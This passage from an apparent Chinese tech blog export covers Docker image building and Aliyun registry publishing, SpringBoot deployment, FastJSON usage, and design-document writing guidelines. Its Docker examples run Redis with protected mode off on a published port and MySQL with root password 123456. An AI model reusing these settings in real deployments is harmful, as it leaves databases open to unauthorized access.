<p>FROM centos:latest<br> MAINTAINER wkcto<br> RUN yum install epel-release -y &amp;&amp; yum install redis -y &amp;&amp; yum install net-tools -y EXPOSE 6379<br> CMD &#x2F;usr&#x2F;bin&#x2F;redis-server –protected-mode no</p>
<p>构建镜像:docker build -t wkcto-redis . </p>
<p>运行镜像:docker run -d -p 6379:6379 390583cf0531</p>
<h2 id="5-5-镜像发布到仓库"><a href="#5-5-镜像发布到仓库" class="headerlink" title="5.5 镜像发布到仓库"></a>5.5 镜像发布到仓库</h2><h3 id="5-5-1-阿里云容器镜像仓库"><a href="#5-5-1-阿里云容器镜像仓库" class="headerlink" title="5.5.1 阿里云容器镜像仓库"></a>5.5.1 阿里云容器镜像仓库</h3><p>网址:<a href="https://dev.aliyun.com/">https://dev.aliyun.com</a></p>
<h3 id="5-5-2-注册阿里云镜像仓库"><a href="#5-5-2-注册阿里云镜像仓库" class="headerlink" title="5.5.2 注册阿里云镜像仓库"></a>5.5.2 注册阿里云镜像仓库</h3><p>如果没有阿里云账号，需要注册一个阿里云账号; 也可以使用淘宝账号、支付宝账号登录;</p>
<h3 id="5-5-3-发布镜像阿里云镜像仓库"><a href="#5-5-3-发布镜像阿里云镜像仓库" class="headerlink" title="5.5.3 发布镜像阿里云镜像仓库"></a>5.5.3 发布镜像阿里云镜像仓库</h3><p>登录阿里云镜像，进入管理中心，在自己我管理中心中，左侧点击镜 像仓库菜单，如果自己没有镜像仓库的话，需要创建一个镜像仓库; 对自己的镜像仓库点击管理链接，按照操作指南进行操作即可;</p>
<ol>
<li><p>登录阿里云 Docker Registry</p>
<p>docker login --username&#x3D;<a href="mailto:&#104;&#x69;&#x33;&#x35;&#51;&#x33;&#49;&#55;&#49;&#x30;&#64;&#97;&#108;&#105;&#121;&#x75;&#x6e;&#x2e;&#99;&#x6f;&#109;">&#104;&#x69;&#x33;&#x35;&#51;&#x33;&#49;&#55;&#49;&#x30;&#64;&#97;&#108;&#105;&#121;&#x75;&#x6e;&#x2e;&#99;&#x6f;&#109;</a> registry.cn-qingdao.aliyuncs.com</p>
<p>用于登录的用户名为阿里云账号全名，密码为开通服务时设置的密码。 您可以在产品控制台首页修改登录密码。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131397.png" alt="image-20201217011107880"></p>
</li>
<li><p>将镜像推送到 Registry</p>
</li>
</ol>
<p>docker tag [ImageId] registry.cn-qingdao.aliyuncs.com&#x2F;123test&#x2F;1234test:[ 镜 像 版 本 号 ] docker push registry.cn-qingdao.aliyuncs.com&#x2F;123test&#x2F;1234test:[镜像版本号] </p>
<p>请根据实际镜像信息替换示例中的[ImageId]和[镜像版本号]参数。</p>
<p>imageId: a78da0202f84</p>
<p>docker tag a78da0202f84 registry.cn-qingdao.aliyuncs.com&#x2F;123test&#x2F;1234test:latest docker push registry.cn-qingdao.aliyuncs.com&#x2F;123test&#x2F;1234test:latest</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212131398.png" alt="image-20201217011146337"></p>
<h3 id="5-5-4-Docker-hub-镜像加速"><a href="#5-5-4-Docker-hub-镜像加速" class="headerlink" title="5-5-4 Docker hub 镜像加速"></a>5-5-4 Docker hub 镜像加速</h3><p>&#x2F;etc&#x2F;docker&#x2F;daemon.json</p>
<p>{“registry-mirrors”: [“<a href="https://gg3gwnry.mirror.aliyuncs.com&quot;]}">https://gg3gwnry.mirror.aliyuncs.com&quot;]}</a></p>
<h1 id="第六章-Docker-应用部署"><a href="#第六章-Docker-应用部署" class="headerlink" title="第六章 Docker 应用部署"></a>第六章 Docker 应用部署</h1><h2 id="6-1-部署一个-SpringBoot-项目"><a href="#6-1-部署一个-SpringBoot-项目" class="headerlink" title="6.1 部署一个 SpringBoot 项目"></a>6.1 部署一个 SpringBoot 项目</h2><ol>
<li><p>将开发的 springboot 程序打成 jar 包或者 war 包;</p>
</li>
<li><p>将打好的 jar 包或 war 包上传到 Linux 某个目录下，比如:&#x2F;root&#x2F;docker</p>
</li>
<li><p>定义 Dockerfile 文件，用于创建项目镜像;</p>
</li>
</ol>
<h2 id="6-2-Docker-部署-Jar-包-SpringBoot-程序"><a href="#6-2-Docker-部署-Jar-包-SpringBoot-程序" class="headerlink" title="6-2 Docker 部署 Jar 包 SpringBoot 程序"></a>6-2 Docker 部署 Jar 包 SpringBoot 程序</h2><h3 id="6-2-1-定义-Jar-包程序-Dockerfile-文件"><a href="#6-2-1-定义-Jar-包程序-Dockerfile-文件" class="headerlink" title="6-2-1 定义 Jar 包程序 Dockerfile 文件"></a>6-2-1 定义 Jar 包程序 Dockerfile 文件</h3><p>FROM wkcto_jdk1.8.0_121<br> MAINTAINER wkcto<br> ADD springboot-web-1.0.0.jar &#x2F;opt<br> RUN chmod +x &#x2F;opt&#x2F;springboot-web-1.0.0.jar CMD java -jar &#x2F;opt&#x2F;springboot-web-1.0.0.jar</p>
<h3 id="6-2-2-构建和运行-Jar-包程序的镜像"><a href="#6-2-2-构建和运行-Jar-包程序的镜像" class="headerlink" title="6-2-2 构建和运行 Jar 包程序的镜像"></a>6-2-2 构建和运行 Jar 包程序的镜像</h3><p>构建镜像:docker build -t springboot-web-jar .</p>
<p>运行容器:docker run -d ac84bde53958</p>
<h3 id="6-2-3-Jar-包程序依赖容器环境准备"><a href="#6-2-3-Jar-包程序依赖容器环境准备" class="headerlink" title="6-2-3 Jar 包程序依赖容器环境准备"></a>6-2-3 Jar 包程序依赖容器环境准备</h3><p>运行 Redis 容器:docker run -p 6379:6379 -d redis</p>
<p>运行 MySQL 容器:docker run -p 3306:3306 -e MYSQL_DATABASE&#x3D;workdb -e MYSQL_ROOT_PASSWORD&#x3D;123456 -d mysql:latest<br> **修改容器保存:**docker commit 容器 id xxx(镜像名:tagxxx)</p>
<p>比如:docker commit b034f6d23833 wkcto_mysql_new </p>
<h3 id="6-2-4-运行-Docker-化的-Jar-包程序"><a href="#6-2-4-运行-Docker-化的-Jar-包程序" class="headerlink" title="6-2-4 运行 Docker 化的 Jar 包程序"></a>6-2-4 运行 Docker 化的 Jar 包程序</h3><p>通过 windows 的浏览器访问，验证 SpringBoot 项目是否可以正常访问;</p>
<h2 id="6-3-Docker-部署-War-包-SpringBoot-程序"><a href="#6-3-Docker-部署-War-包-SpringBoot-程序" class="headerlink" title="6-3 Docker 部署 War 包 SpringBoot 程序"></a>6-3 Docker 部署 War 包 SpringBoot 程序</h2><h3 id="6-3-1-定义-War-包程序-Dockerfile-文件"><a href="#6-3-1-定义-War-包程序-Dockerfile-文件" class="headerlink" title="6-3-1 定义 War 包程序 Dockerfile 文件"></a>6-3-1 定义 War 包程序 Dockerfile 文件</h3><p>FROM wkcto-tomcat-8.5.24<br> MAINTAINER wkcto<br> ADD springboot-web-1.0.0.war &#x2F;usr&#x2F;local&#x2F;apache-tomcat-8.5.24&#x2F;webapps EXPOSE 8080<br> CMD &#x2F;usr&#x2F;local&#x2F;apache-tomcat-8.5.24&#x2F;bin&#x2F;catalina.sh run</p>
<h3 id="6-3-2-构建和运行-War-包程序的镜像"><a href="#6-3-2-构建和运行-War-包程序的镜像" class="headerlink" title="6-3-2 构建和运行 War 包程序的镜像"></a>6-3-2 构建和运行 War 包程序的镜像</h3><p>构建镜像:docker build -t springboot-web-war .</p>
<h3 id="6-3-3-War-包程序依赖容器环境准备"><a href="#6-3-3-War-包程序依赖容器环境准备" class="headerlink" title="6-3-3 War 包程序依赖容器环境准备"></a>6-3-3 War 包程序依赖容器环境准备</h3><p>与上面部署 Jar 程序依赖的容器环境一样;</p>
<h3 id="6-3-4-运行-Docker-化的-War-包程序"><a href="#6-3-4-运行-Docker-化的-War-包程序" class="headerlink" title="6-3-4 运行 Docker 化的 War 包程序"></a>6-3-4 运行 Docker 化的 War 包程序</h3><p>通过 windows 的浏览器访问，验证 SpringBoot 项目是否可以正常访问; springboot-web-1.0.0.war → springboot-web-1.0.0</p>
]]></content>
      <categories>
        <category>base</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJSON</title>
    <url>/2021/12/21/FastJSON/</url>
    <content><![CDATA[<h1 id="FastJSON"><a href="#FastJSON" class="headerlink" title="FastJSON"></a>FastJSON</h1><h3 id="将Java对象转换为JSON格式"><a href="#将Java对象转换为JSON格式" class="headerlink" title="将Java对象转换为JSON格式"></a>将Java对象转换为JSON格式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">     </span><br><span class="line">    <span class="meta">@JSONField(name = &quot;AGE&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@JSONField(name = &quot;FULL NAME&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String fullName;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@JSONField(name = &quot;DATE OF BIRTH&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date dateOfBirth;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(<span class="type">int</span> age, String fullName, Date dateOfBirth)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.fullName= fullName;</span><br><span class="line">        <span class="built_in">this</span>.dateOfBirth = dateOfBirth;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 标准 getters &amp; setters</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> List&lt;Person&gt; listOfPersons = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Person&gt;();</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Before</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUp</span><span class="params">()</span> &#123;</span><br><span class="line">    listOfPersons.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">15</span>, <span class="string">&quot;John Doe&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">    listOfPersons.add(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">20</span>, <span class="string">&quot;Janette Doe&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>()));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">whenJavaList_thanConvertToJsonCorrect</span><span class="params">()</span> &#123;</span><br><span class="line">    String jsonOutput= JSON.toJSONString(listOfPersons);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">[  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="string">&quot;AGE&quot;</span>:<span class="number">15</span>,</span><br><span class="line">        <span class="string">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1468962431394</span>,</span><br><span class="line">        <span class="string">&quot;FULL NAME&quot;</span>:<span class="string">&quot;John Doe&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="string">&quot;AGE&quot;</span>:<span class="number">20</span>,</span><br><span class="line">        <span class="string">&quot;DATE OF BIRTH&quot;</span>:<span class="number">1468962431394</span>,</span><br><span class="line">        <span class="string">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Janette Doe&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<h2 id="String转化为JSONObject"><a href="#String转化为JSONObject" class="headerlink" title="String转化为JSONObject"></a>String转化为JSONObject</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">JSONObject</span> <span class="variable">jsonObject1</span> <span class="operator">=</span>JSONObject.parseObject(String)</span><br></pre></td></tr></table></figure>



<h3 id="创建JSON对象"><a href="#创建JSON对象" class="headerlink" title="创建JSON对象"></a>创建JSON对象</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">whenGenerateJson_thanGenerationCorrect</span><span class="params">()</span> <span class="keyword">throws</span> ParseException &#123;</span><br><span class="line">    <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;AGE&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;FULL NAME&quot;</span>, <span class="string">&quot;Doe &quot;</span> + i);</span><br><span class="line">        jsonObject.put(<span class="string">&quot;DATE OF BIRTH&quot;</span>, <span class="string">&quot;2016/12/12 12:12:12&quot;</span>);</span><br><span class="line">        jsonArray.add(jsonObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">String</span> <span class="variable">jsonOutput</span> <span class="operator">=</span> jsonArray.toJSONString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line">[</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="string">&quot;AGE&quot;</span>:<span class="string">&quot;10&quot;</span>,</span><br><span class="line">      <span class="string">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;2016/12/12 12:12:12&quot;</span>,</span><br><span class="line">      <span class="string">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Doe 0&quot;</span></span><br><span class="line">   &#125;,</span><br><span class="line">   &#123;</span><br><span class="line">      <span class="string">&quot;AGE&quot;</span>:<span class="string">&quot;10&quot;</span>,</span><br><span class="line">      <span class="string">&quot;DATE OF BIRTH&quot;</span>:<span class="string">&quot;2016/12/12 12:12:12&quot;</span>,</span><br><span class="line">      <span class="string">&quot;FULL NAME&quot;</span>:<span class="string">&quot;Doe 1&quot;</span></span><br><span class="line">   &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="JSONObject-转对象"><a href="#JSONObject-转对象" class="headerlink" title="JSONObject 转对象"></a>JSONObject 转对象</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IdentifyRequest</span> <span class="variable">identifyRequest</span> <span class="operator">=</span> JSON.toJavaObject(jsonObject, IdentifyRequest.class);</span><br></pre></td></tr></table></figure>

<h2 id="ObjectMapper"><a href="#ObjectMapper" class="headerlink" title="ObjectMapper"></a>ObjectMapper</h2><p>fastJson 没有驼峰对应规则</p>
<p><a href="https://www.jb51.net/article/121697.htm">https://www.jb51.net/article/121697.htm</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>Design Doc Readability</title>
    <url>/2021/12/21/Design%20Doc%20Readability/</url>
    <content><![CDATA[<h1 id="Design-Doc-Readability"><a href="#Design-Doc-Readability" class="headerlink" title="Design Doc Readability"></a>Design Doc Readability</h1><p><a href="https://to.woa.com/read-dd">https://to.woa.com/read-dd</a></p>
<h1 id="What-is-a-Design-Doc"><a href="#What-is-a-Design-Doc" class="headerlink" title="What is a Design Doc?"></a><strong>What is a Design Doc?</strong></h1><p>设计文档是对一个技术问题的解决方案的系统性描述。</p>
<h1 id="Why-writing-Design-Docs"><a href="#Why-writing-Design-Docs" class="headerlink" title="Why writing Design Docs?"></a><strong>Why writing Design Docs?</strong></h1><ul>
<li>是否有必要花费前期时间来增加正确设计软件的确定性？</li>
<li>与此相关的是，由于高级工程师无法确保能够审核每一次代码变更，让他们参与设计是否有帮助？</li>
<li>软件设计是模棱两可的，甚至是有争议的，因而围绕设计文档在组织上达成共识是有价值的？</li>
<li>我的团队是否会忽略设计中的隐私性、安全性、日志记录或其它交叉问题？</li>
<li>是否有必要写一份文档来对组织中有关遗留系统的设计问题提供高层次的见解？</li>
</ul>
<p>通过设计文档，我们可以：</p>
<ul>
<li><p>在可以低成本迭代的时候，尽早发现设计中的问题</p>
</li>
<li><ul>
<li>设计左移，代价左移</li>
</ul>
</li>
<li><p>在团队中对设计达成一致</p>
</li>
<li><ul>
<li>设计的本质是取舍(tradeoff)。几乎所有的架构设计决策都会被挑战，原因之一是读者并非对所有的取舍都知晓并与作者达成共识。将 pros&#x2F;cons 通过设计文档清晰地列出取舍，有利于帮助读者了解（并认可）你的决策思路，可以减少被挑战的可能。</li>
</ul>
</li>
<li><p>将资深工程师的经验和思想扩展到整个团队，帮助团队成长</p>
</li>
<li><ul>
<li>作为作者，可以供资浅工程师学习</li>
<li>作为读者，可以审核资浅工程师的设计并提供建议</li>
</ul>
</li>
<li><p>形成团队软件设计的一致方式，沉淀团队&#x2F;公司技术积累</p>
</li>
<li><ul>
<li>企业的生命力在于知识价值的积累</li>
</ul>
</li>
</ul>
<p>设计文档是需要编写成本的。 如果问题的解决方案非常清晰，没有明确的取舍，设计文档中基本都是实现描述，则应该省略设计文档而直接实现。换言之，如果编写设计文档的时间主要消耗在“写”而不是在“思考”上，则这个设计文档可省略。</p>
<h1 id="Why-call-it-Readability"><a href="#Why-call-it-Readability" class="headerlink" title="Why call it Readability?"></a><strong>Why call it Readability?</strong></h1><h3 id="设计文档的读写比最高"><a href="#设计文档的读写比最高" class="headerlink" title="设计文档的读写比最高"></a><strong>设计文档的读写比最高</strong></h3><p>设计文档 &gt; API &gt; 代码</p>
<p>设计文档用来被读的时间往往远多于写的时间。因此，编写设计文档时更应该考虑读者的体验而非作者的体验。</p>
<h3 id="设计文档不是文学写作"><a href="#设计文档不是文学写作" class="headerlink" title="设计文档不是文学写作"></a><strong>设计文档不是文学写作</strong></h3><p>设计文档的目的是为了沟通设计，而不是为了自我表达。</p>
<p>把精力放在如何清晰、简洁地表达，而非放在文采上。</p>
<h3 id="为读者而写"><a href="#为读者而写" class="headerlink" title="为读者而写"></a><strong>为读者而写</strong></h3><p>首先，了解你的读者。</p>
<p>读者群体是谁？</p>
<p> 读者不应该只是你的 TL 以及该设计文档的实施者； 你的设计文档真正受众的范围往往大得多。在不确定的时候，经验做法是，假设的读者群体为：公司内部的、有一定工程经验的、但对该系统的上下文只有初步了解的软件工程师。</p>
<p>通常，设计文档的范围越大，假定的受众群也会更大，也就意味着受众对目标系统的平均了解程度更低，也就意味着设计文档往往需要：</p>
<ul>
<li>更加详细的背景介绍</li>
<li>更少使用内部术语或缩写</li>
<li>更多阐述设计思路、取舍，更少解释具体实现细节</li>
</ul>
<p>读者如何阅读？ </p>
<p>大部分读者不会逐字逐句阅读你的设计文档。大家都很忙。 读者通常只会扫描大体结构，然后阅读自己感兴趣的部分。 </p>
<h3 id="设计文档-VS-代码-Readability"><a href="#设计文档-VS-代码-Readability" class="headerlink" title="设计文档 VS 代码 Readability"></a><strong>设计文档 VS 代码 Readability</strong></h3><ul>
<li>着重强调的内容应该是并非显而易见的事项：</li>
</ul>
<table>
<thead>
<tr>
<th><strong>设计文档</strong></th>
<th><strong>代码文档</strong></th>
</tr>
</thead>
<tbody><tr>
<td>背景</td>
<td>上下文</td>
</tr>
<tr>
<td>强调 Why&#x2F;权衡&#x2F;其它方案</td>
<td>强调 “Why” 动机</td>
</tr>
<tr>
<td>注意事项</td>
<td>注意事项</td>
</tr>
<tr>
<td>代码可以清晰表达的内容不需要文档</td>
<td>代码可以清晰表达的内容不需要文档</td>
</tr>
</tbody></table>
<ul>
<li><p>没有绝对的正确答案：没有完美的代码，也没有完美的设计文档。</p>
</li>
<li><ul>
<li>不同的读者对可读性的理解有细微的不同。 可读性是主观的。</li>
<li>在实践中，我们追求让更多（而非所有）读者更顺畅地阅读设计文档。</li>
</ul>
</li>
<li><p>我们的目标是有意识地提高文档写作&#x2F;代码水平。高质量的写作是一种习惯。</p>
</li>
<li><ul>
<li>多读</li>
<li>评审 （Design doc review&#x2F;Code review）有益</li>
<li>多写</li>
</ul>
</li>
</ul>
<h2 id="为读者而写-1"><a href="#为读者而写-1" class="headerlink" title="为读者而写"></a>为读者而写</h2><p>要了解读者画像</p>
<p>大部分读者不会很详细的读，得让读者在短时间内了解整体思想</p>
<h1 id="Core-Principles"><a href="#Core-Principles" class="headerlink" title="Core Principles"></a><strong>Core Principles</strong></h1><h3 id="写作风格的三要素"><a href="#写作风格的三要素" class="headerlink" title="写作风格的三要素"></a><strong>写作风格的三要素</strong></h3><ul>
<li>清晰</li>
<li>简洁</li>
<li>优雅</li>
</ul>
<h3 id="设计的要点"><a href="#设计的要点" class="headerlink" title="设计的要点"></a><strong>设计的要点</strong></h3><h4 id="任何架构问题都是取舍。"><a href="#任何架构问题都是取舍。" class="headerlink" title="任何架构问题都是取舍。"></a><strong>任何架构问题都是取舍。</strong></h4><p>Everything in software architecture is a tradeoff.</p>
<p>在软件设计中，没有任何一个维度有绝对意义上的优劣。 每一个设计决定都需要考量很多相违背的因素。</p>
<p>例如，可扩展性和效率相背； 长期效率和短期收益相背；规模化提升了效率，但降低了灵活性。“高内聚低耦合” 便于迭代，但是会增加短期的开发成本。 NoSQL 比 SQL 性能高，但代价是功能的大幅降低。</p>
<p>如果一个设计决策看上去没有任何的取舍，往往是因为取舍还没有被识别。</p>
<h4 id="“为什么”-比-“怎么做”-更重要。"><a href="#“为什么”-比-“怎么做”-更重要。" class="headerlink" title="“为什么” 比 “怎么做” 更重要。"></a><strong>“为什么” 比 “怎么做” 更重要。</strong></h4><p>WHY is more important than HOW.</p>
<h4 id="考虑时间维度"><a href="#考虑时间维度" class="headerlink" title="考虑时间维度"></a><strong>考虑时间维度</strong></h4><p>Software Engineering &#x3D; Codng * Time.</p>
<p>做设计取舍时需要考虑可维护性、可扩展性。 考虑未来计划。</p>
<h4 id="避免过度设计"><a href="#避免过度设计" class="headerlink" title="避免过度设计"></a><strong>避免过度设计</strong></h4><p>Avoid over design.</p>
<p>设计伊始，界定问题的范围。 一个良好界定的问题是一个良好设计的必要条件。</p>
<p>不要迷信设计模型、设计模式、XX 驱动设计。这些是工具，而非法则。不要为了制造问题而解决问题。不要通过复杂的设计来体现工作的难度和深度: 一个困难的问题可能会有一个简单的答案。</p>
<p>不要过于担忧设计迅速淘汰。保留可扩展性，但不要在未知时浪费精力扩展。 </p>
<p><a href="https://www.itworks.hu/the-parable-of-the-object-oriented-programmer-and-breakfast/">https://www.itworks.hu/the-parable-of-the-object-oriented-programmer-and-breakfast/</a></p>
<p><a href="https://github.com/EnterpriseQualityCoding/FizzBuzzEnterpriseEdition">https://github.com/EnterpriseQualityCoding/FizzBuzzEnterpriseEdition</a></p>
<h1 id="Design-Doc-Best-Practices"><a href="#Design-Doc-Best-Practices" class="headerlink" title="Design Doc Best Practices"></a><strong>Design Doc Best Practices</strong></h1><h2 id="遣词"><a href="#遣词" class="headerlink" title="遣词"></a><strong>遣词</strong></h2><p>用词要简练、准确、直白。</p>
<ul>
<li><p>正确使用专业术语。</p>
</li>
<li><ul>
<li><p>合理地使用常见术语可以降低沟通成本。</p>
</li>
<li><p>不要过多使用过于小众或自创的术语。如果有必要，需要在文中</p>
</li>
<li><ul>
<li>必要时提供对照的英文术语以方便理解。</li>
<li>避免无上下文的缩略词。</li>
</ul>
</li>
</ul>
</li>
<li><p>省略程度副词</p>
</li>
<li><ul>
<li>不管作者意图为何， “非常重要” 和 “重要” 在读者看来大同小异。</li>
</ul>
</li>
<li><p>使用数据</p>
</li>
<li><ul>
<li>与其说明“该系统的性能提升明显”，不如“该系统的性能提升了42%”更为可信，也更方便读者做出自己的判断。</li>
</ul>
</li>
<li><p>忌佶屈聱牙</p>
</li>
<li><ul>
<li>例如上文，应改为“不要使用过于生僻的词汇，不要过度使用书面语”</li>
<li>千万不要写文言文</li>
</ul>
</li>
</ul>
<h2 id="造句"><a href="#造句" class="headerlink" title="造句"></a><strong>造句</strong></h2><ul>
<li><p>使用短句，不要使用多从句的复杂句式。</p>
</li>
<li><ul>
<li>读者不是来考 GRE 的。</li>
<li>写文档也不是为了炫耀自己可以驾驭长难句。</li>
</ul>
</li>
</ul>
<p><em>“系统形式问题就是下面这样一个问题：怎样把各种不同的对象种类安排在一个系统中，以使较高的对象种类总能从较低的对象种类构造出来，也就是说前者可还原为后者。为了解决这个问题，我们必须从其相互可还原性来研究各种不同的对象种类。为此目的，我们要根据所涉及的对象领域的实际科学知识为每一个要考察的对象寻找其基本事实存在的充分而必要的条件的各种可能性。对此我们可采取下面的办法来进行，即要求这门实际科学给出基本事实的一个（确实而常在的）表征。”</em></p>
<p><em>Excerpt From: 【德】鲁道夫·卡尔纳普. “世界的逻辑构造.”</em> </p>
<ul>
<li><p>简单表达，去掉无意义的修饰，去掉试图缓和语气的从句。</p>
</li>
<li><ul>
<li><p>反例：“我们可以看到， TencentDB 在一定程度上可以满足我们对事务支持的需求。”</p>
</li>
<li><ul>
<li>修改后：“TencentDB 支持事务”。</li>
</ul>
</li>
<li><p>反例： “MR 提交信息作为读者查阅修改历史时第一时间看到的信息，其重要性不言而喻。”</p>
</li>
<li><ul>
<li>修改后：“读者查阅修改历史时会首先关注 MR 提交信息。”</li>
</ul>
</li>
<li><p>本段讨论另一个问题，即……</p>
</li>
</ul>
</li>
<li><p>避免过于口语化。</p>
</li>
<li><ul>
<li>不要加顺口溜</li>
<li>不要使用语气词</li>
<li>不要使用叹号！ 如果希望强调，使用<strong>粗体</strong>或者<em>斜体</em>即可！也可以使用分级标题！！！</li>
</ul>
</li>
</ul>
<p>准确</p>
<ul>
<li>描述客观事实，避免加入主观情绪。</li>
</ul>
<h2 id="段落"><a href="#段落" class="headerlink" title="段落"></a><strong>段落</strong></h2><p>段落应该尽量短。通常，一个段落不要超过 8 个完整的句子。</p>
<p>每个段落有且仅有一个清晰的主题。每个段落开头应该是主题句，方便读者快速了解段落大意。段落中的每一句话应该与主题紧密相关； 否则，它应该另起段落，或者应该删掉。</p>
<p>注意段落的流动。段落句子应该始于一个读者已经熟悉的概念，将新的内容放在句子结尾。这样，读者可以更连贯地理解。</p>
<p>使用列表</p>
<p>使用 Bullet point 标明无顺序的列表，使用数字序号明确前后顺序。</p>
<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a><strong>结构</strong></h2><p>使用模板</p>
<p>使用图表</p>
<p>使用标题</p>
<p>标题要分级</p>
<p>标题要简短清晰</p>
<h2 id="篇幅"><a href="#篇幅" class="headerlink" title="篇幅"></a><strong>篇幅</strong></h2><p>设计文档不要过长。太多内容堆积在一个文档中会让读者丧失兴趣。</p>
<p>对于一个大型项目来说，10页（~5000字）左右是一个合适的长度。当超过这个长度时，可以考虑将问题拆分成子问题分别编写设计文档，并在总体设计文档中链接子设计文档。</p>
<p>对于小问题做增量的改进，考虑使用单页文档(one-pager)。通常这类文档的范围较小，解决问题较简单，目标用户群体仅限于对问题已经有充分了解的内部成员。这时，可以省略背景等内容，而仅使用 目标 – 方案 两段式论证的结构。</p>
<h2 id="排版"><a href="#排版" class="headerlink" title="排版"></a><strong>排版</strong></h2><p>使用统一的字体。 用户不会意识到不同的字体代表不同的含义，只会感受到混乱。</p>
<p>微软雅黑是安全选择。</p>
<p>不要使用不同颜色来区分内容。不要在文中使用超过三种颜色。 可以在标题及分级标题使用标志性的颜色，同时正文使用黑色。</p>
<h1 id="Design-Doc-Template"><a href="#Design-Doc-Template" class="headerlink" title="Design Doc Template"></a><strong>Design Doc Template</strong></h1><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a><strong>目标</strong></h2><p>“我们要解决什么问题？”</p>
<p>用几句话说明该设计文档的关键系统目的，让读者能够一眼得知自己是否对该设计文档感兴趣。</p>
<p>如：</p>
<p>“本文描述 Spanner 的顶层设计”</p>
<p>继而，使用 Bullet Points 描述该设计试图达到的重要目标，如：</p>
<ul>
<li>可扩展性</li>
<li>多版本</li>
<li>全球分布</li>
<li>同步复制</li>
</ul>
<p>非目标也可能很重要。</p>
<p>非目标并非单纯目标的否定形式，也不是与解决问题无关的其它目标，而是一些可能是读者非预期的、本可作为目标但并没有的目标，如：</p>
<ul>
<li>高可用性</li>
<li>高可靠性</li>
</ul>
<p>如果可能，解释是基于哪些方面的考虑将之作为非目标。如：</p>
<ul>
<li>可维护性： 本服务只是过渡方案，预计寿命三个月，待 XX 上线运行后即可下线</li>
</ul>
<p>设计不是试图达到完美，而是试图达到平衡。 显式地声明哪些是是目标，哪些是非目标，有助于帮助读者理解下文中设计决策的合理性，同时也有助于日后迭代设计时，检查最初的假设是否仍然成立。</p>
<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a><strong>背景</strong></h2><p>“我们为什么要解决这个问题？”</p>
<p>为设计文档的目标读者提供理解详细设计所需的背景信息。</p>
<p>按读者范围来提供背景。见上文关于目标读者的圈定。</p>
<p>设计文档应该是是“自足的”（self-contained），即应该为读者提供足够的背景知识，使其无需进一步的查阅资料即可理解后文的设计。</p>
<p>保持简洁，通常以几段为宜，每段简要介绍即可。如果需要向读者提供进一步的信息，最好只提供链接。</p>
<p>警惕知识的诅咒。 <strong>知识的诅咒</strong>（Curse of knowledge）是一种<a href="https://zh.wikipedia.org/wiki/%E8%AA%8D%E7%9F%A5%E5%81%8F%E5%B7%AE">认知偏差</a>，指人在与他人交流的时候，下意识地假设对方拥有理解所需要的背景知识。</p>
<p>背景通常可以包括：</p>
<ul>
